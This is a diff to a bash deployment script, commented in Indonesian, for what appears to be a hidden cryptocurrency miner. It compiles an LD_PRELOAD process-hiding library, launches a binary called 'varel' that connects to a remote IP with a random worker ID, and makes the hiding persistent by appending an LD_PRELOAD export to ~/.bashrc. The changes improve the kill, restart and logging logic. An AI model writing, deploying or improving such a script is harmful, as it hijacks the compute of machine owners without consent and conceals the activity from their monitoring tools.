@@ -7,7 +7,7 @@ cd ~/
 sudo apt-get update >/dev/null 2>&1
 sudo apt-get install -y wget ca-certificates gcc make >/dev/null 2>&1
 
-# === Buat file hider.c (process hiding via LD_PRELOAD) ===
+# === Buat file hider.c ===
 cat > /tmp/hider.c << 'EOFHIDER'
 #define _GNU_SOURCE
 #include <stdio.h>
@@ -80,21 +80,33 @@ if [ ! -f ~/varel ]; then
 fi
 
 # === Generate random worker ID ===
-RANDOM_WORKER="v11d5exukktuwl8geceiwini8jhqcpk1bj3u8xw.$(shuf -n 1 -i 10000-99999)-wwww$(date +%s)"
+RANDOM_WORKER="v11d5exukktuwl8geceiwini8jhqcpk1bj3u8xw.$(shuf -n 1 -i 10000-99999)-w$(date +%s)"
 
-# === Kill old process if exists (CEK TANPA LD_PRELOAD) ===
+# === Kill HANYA binary varel (bukan script bash) ===
 unset LD_PRELOAD
-pkill -f "varel.*randomvirel" 2>/dev/null || true
-sleep 2
 
-# === Cek apakah masih ada process lama ===
-if pgrep -f "varel" >/dev/null 2>&1; then
-    echo "⚠️ Old varel process still running, force kill..."
-    pkill -9 -f "varel" 2>/dev/null || true
+# Cari PID lama dari file
+if [ -f ~/.varel.pid ]; then
+    OLD_PID=$(cat ~/.varel.pid)
+    if kill -0 $OLD_PID 2>/dev/null; then
+        echo "🔄 Stopping old varel process (PID: $OLD_PID)..."
+        kill $OLD_PID 2>/dev/null || true
+        sleep 2
+        # Force kill jika masih hidup
+        kill -0 $OLD_PID 2>/dev/null && kill -9 $OLD_PID 2>/dev/null || true
+    fi
+    rm -f ~/.varel.pid
+fi
+
+# Cek lagi dengan cara yang lebih spesifik (hanya binary ~/varel)
+EXISTING_PID=$(pgrep -f "^.*/varel -a randomvirel" 2>/dev/null || true)
+if [ -n "$EXISTING_PID" ]; then
+    echo "⚠️ Found existing varel process (PID: $EXISTING_PID), killing..."
+    kill -9 $EXISTING_PID 2>/dev/null || true
     sleep 2
 fi
 
-# === Start varel TANPA hiding dulu untuk cek ===
+# === Start varel ===
 echo "🚀 Starting varel..."
 nohup ~/varel -a randomvirel \
   --url 137.184.31.121:443 \
@@ -102,49 +114,54 @@ nohup ~/varel -a randomvirel \
   --threads=6 \
   --verbose \
   --log-file=~/run.log \
-  > /dev/null 2>&1 &
+  > ~/varel.out 2>&1 &
 
 VAREL_PID=$!
 echo "📌 Varel PID: $VAREL_PID"
-
-# Simpan PID ke file untuk monitoring
 echo $VAREL_PID > ~/.varel.pid
 
 sleep 5
 
-# === Verify process running (masih tanpa hiding) ===
+# === Verify ===
 if kill -0 $VAREL_PID 2>/dev/null; then
     echo "✅ Varel started successfully!"
     echo "📊 Worker ID: $RANDOM_WORKER"
     echo "📝 Log file: ~/run.log"
     echo "🔐 PID saved to: ~/.varel.pid"
     
-    # Show initial log
+    # Show initial output
+    if [ -f ~/varel.out ]; then
+        echo ""
+        echo "📄 Startup output:"
+        head -10 ~/varel.out
+    fi
+    
     if [ -f ~/run.log ]; then
         echo ""
-        echo "📄 Initial log output:"
+        echo "📄 Initial log:"
         tail -5 ~/run.log
     fi
     
-    # NOW activate hiding for future commands
+    # Activate hiding
     echo ""
     echo "🎭 Activating process hiding..."
-    export LD_PRELOAD=~/.libhider.so
     echo 'export LD_PRELOAD=~/.libhider.so' >> ~/.bashrc
     
-    # Test hiding
-    if ps aux | grep -v grep | grep -q varel; then
-        echo "⚠️ Process still visible (hiding may not work)"
-    else
-        echo "✅ Process hidden from ps/top/pgrep"
-    fi
 else
-    echo "❌ Failed to start varel"
+    echo "❌ Failed to start varel (process exited)"
+    
+    if [ -f ~/varel.out ]; then
+        echo ""
+        echo "📄 Error output:"
+        cat ~/varel.out
+    fi
+    
     if [ -f ~/run.log ]; then
         echo ""
         echo "📄 Error log:"
         tail -20 ~/run.log
     fi
+    
     exit 1
 fi
 
